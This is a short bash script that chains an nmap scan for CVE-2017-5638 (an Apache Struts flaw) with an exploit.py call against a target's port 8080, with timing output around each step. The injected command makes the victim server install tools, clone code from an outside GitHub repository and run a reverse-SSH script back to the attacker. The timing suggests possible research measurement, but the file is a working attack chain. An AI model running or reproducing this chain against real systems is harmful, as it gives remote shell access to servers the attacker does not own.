#!/bin/bash
start=$(date +%s)
#$1 is target IP
nmap -sV --script /home/cve-2017-5638.nse $1 -d
end=$(date +%s)
echo nmap time: $(( $end - $start )) seconds

startssh=$(date +%s)
##$2 is the port used in machine of attacker for ssh
python /home/exploit.py http://$1:8080/ "apt-get update -q=2 && apt-get install git expect ssh -y -q=2 && rm -rf CVE-2017-5638 && git clone https://github.com/lizhi16/CVE-2017-5638 && cd CVE-2017-5638 && chmod a+x *.sh && ./ssh-reverse.sh $2"

endssh=$(date +%s)
echo ssh-reverse time: $(( $endssh - $startssh )) seconds

#echo totle time: $(( $endssh - $start )) seconds
